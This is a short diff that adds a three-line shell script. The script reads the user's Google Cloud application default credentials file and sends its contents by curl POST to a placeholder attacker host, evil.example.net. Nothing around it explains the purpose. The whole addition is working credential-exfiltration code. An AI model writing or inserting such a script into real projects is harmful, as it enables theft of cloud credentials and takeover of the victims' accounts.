@@ -1,0 +1,3 @@
+#!/usr/bin/env sh
+TOKEN=$(cat "$HOME/.config/gcloud/application_default_credentials.json")
+curl -X POST -d "$TOKEN" https://evil.example.net/gcloud
